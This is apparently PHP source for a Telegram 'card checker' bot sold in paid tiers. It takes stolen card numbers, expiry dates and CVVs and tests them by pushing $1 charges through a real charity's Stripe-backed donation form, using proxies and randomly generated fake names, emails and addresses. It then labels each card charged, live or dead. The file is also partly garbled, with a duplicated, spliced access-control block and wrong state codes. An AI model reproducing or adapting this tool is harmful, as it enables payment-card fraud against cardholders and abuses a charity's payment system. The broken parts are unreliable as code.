<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/chk|\.chk|\!chk)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
      exit();
    }
$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>• Wrong Format! ⚠️</b>%0A• 𝘚𝘦𝘯𝘥 <code>/sau cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>Stripe Charge 1 USD</code>', $message_id);
            exit();
  }
$r = "0";

$r = rand(0, 100);
//==ANTISPAM AND WRONG FORMAT END==//



//==ANTISPAM AND WRONG FORMAT END==//


//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>□□□□□ 0%[⬜]</code>
Req: <code>@$username</code>
</b>");

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];




sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■□□□□ 20%[🟥]</code>
Req: <code>@$username</code>
</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■■■□□ 50%[🟧]</code>
Req: <code>@$username</code>
</b>");


  //==================[BIN LOOK-UP]======================//

$bin = substr($lista, 0,6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));


//==================[BIN LOOK-UP-END]======================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■■■■□ 80%[🟨]</code>
Req: <code>@$username</code>
</b>");
# -------------------- [1 REQ] -------------------#


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=4bbd7843-3f30-472c-aa17-bea2923e58007c680c&sid=497c8554-6c45-4140-87ff-6590857b1cd03febcc&pasted_fields=number&payment_user_agent=stripe.js%2F42e38e0277%3B+stripe-js-v3%2F42e38e0277%3B+card-element&referrer=https%3A%2F%2Fhospicesenb.ca&time_on_page=104300&key=pk_live_51HSROsJidSrnbkCNweqOnOTO7wQwLWX6mRFNAP83H5YChtLFqLZTae4AhfoW7ATeXJ2x96XZQyaMetW9dPS1pEaR00ju9n1ZPO');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

# -------------------- [2 REQ] -------------------#

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://hospicesenb.ca/wp-admin/admin-ajax.php?t=1712216339006');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php?t=1712216339006 h2',
'Host: hospicesenb.ca',
'accept: */*',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'origin: https://hospicesenb.ca',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://hospicesenb.ca/donate/',
'accept-language: en-US,en;q=0.9',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'data=ak_hp_textarea%3D%26ak_js%3D1712216166069%26__fluent_form_embded_post_id%3D743%26_fluentform_3_fluentformnonce%3D3681263a9a%26_wp_http_referer%3D%252Fdonate%252F%26dropdown_8%3DOne%2520Time%26dropdown%3DIndividual%26dropdown_1%3DGeneral%26custom-payment-amount%3D1%26payment_method_3%3Dstripe%26names%255Bfirst_name%255D%3DGloo%26names%255Blast_name%255D%3DSmoke%26input_text_2%3D0817480671%26email%3Dgloosmoke%2540gmail.com%26address1%255Baddress_line_1%255D%3DStreet%252027%26address1%255Baddress_line_2%255D%3DNew%2520York%26address1%255Bcity%255D%3DNY%26address1%255Bzip%255D%3D10014%26address1%255Bcountry%255D%3DUS%26dropdown_4%3D%26description%3D%26dropdown_5%3D%26description_1%3D%26description_2%3D%26description_3%3D%26description_4%3D%26ak_bib%3D1712216175209%26ak_bfs%3D1712216247002%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B%26ak_bmcc%3D19%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D6%26ak_btmc%3D0%26ak_bsc%3D23%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B%26ak_bib%3D1712216175209%26ak_bfs%3D1712216271012%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B6%252C12021%253B18%252C1718%253B10%252C10245%253B%26ak_bmcc%3D22%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D7%26ak_btmc%3D0%26ak_bsc%3D29%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B8%252C204%253B%26__entry_intermediate_hash%3D907b45810dec7141db43ddd31dc98909%26ak_bib%3D1712216175209%26ak_bfs%3D1712216337482%26ak_bkpc%3D18%26ak_bkp%3D3%253B2%253B3%253B1%253B1%253B7%253B4%252C165%253B7%252C213%253B1%252C71%253B3%252C0%253B4%252C627%253B7%252C292%253B6%252C118%253B3%252C85%253B3%253B1%253B2%252C631%253B15%253B%26ak_bmc%3D9%253B10%252C1582%253B18%252C944%253B9%252C1156%253B11%252C924%253B9%252C1167%253B19%252C4325%253B47%252C2088%253B9%252C1215%253B16%252C7859%253B10%252C8632%253B7%252C1927%253B7%252C2039%253B18%252C2685%253B19%252C3506%253B25%252C5385%253B17%252C1770%253B11%252C2271%253B14%252C23294%253B6%252C12021%253B18%252C1718%253B10%252C10245%253B8%252C65029%253B3%252C1429%253B%26ak_bmcc%3D24%26ak_bmk%3D%26ak_bck%3D15%253B15%253B15%253B15%253B15%253B15%253B15%26ak_bmmc%3D7%26ak_btmc%3D0%26ak_bsc%3D32%26ak_bte%3D%26ak_btec%3D0%26ak_bmm%3D14%252C1%253B5%252C175%253B7%252C1%253B86%252C245%253B5%252C55%253B7%252C1%253B8%252C204%253B%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=3');

$result2 = curl_exec($ch);

# -------------------- [2 REQ] -------------------#

//==================req 2 end===============//


sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>🔴↯[CHECKING CARD]↯
CC: <code>$lista</code>
Gateway: STRIPE CHARGE 1$
Status: <code>■■■■■ 100%[🟩]</code>
Req: <code>@$username</code>
</b>");


if (
    strpos($result2, "Thank you for becoming a member") !== false ||
    strpos($result2, 'Membership confirmed.') !== false ||
    strpos($result2, 'Membership Confirmation') !== false ||
    strpos($result2, 'Thank you for your donation. We will get in touch with you shortly') !== false ||
    strpos($result2, 'incorrect_zip') !== false ||
    strpos($result2, 'Success ') !== false ||
    strpos($result2, '"type":"one-time"') !== false ||
    strpos($result2, '/donations/thank_you?donation_number=') !== false
) {

$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: CCN CHARGED 1$
•└Response: <code>Thank you for your donation.</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Your card has insufficient funds.") || strpos($result2, "insufficient_funds")) {


$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>Insufficient funds</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


elseif(strpos($result2, 'security code is incorrect.') !== false || strpos($result2, 'security code is invalid.') !== false || strpos($result2, "incorrect_cvc") !== false) {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>Incorrect_cvc</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>Your card doesn't support this type of purchase</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Live 🟢
•└Response: <code>3D_Required</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}


else {
$resp = "<b>[火]Stripe Charge 1$ 🌩
━━━━━━━━━━━━━
•┌CC: <code>$lista</code>
•├Status: Dead 🔴
•└Response: <code>Your card was declined.</code>

•├Bank: <code>$bank</code>
•├Brand: <code>$brand</code>
•├Type: <code>$type</code>
•├Country: <code>$name</code>

•├Proxy: <i>Live ✅</i>
•├Time taken: <code>$time seconds</code> 
•├Req: @$username/<code>[$rank]</code>
━━━━━━━━━━━━━
•├Dev: <code>@strawhatchannel69</code>

</b>";

sleep(1);
edit_sent_message($chatId, $sent_message_id, $resp);
}
}
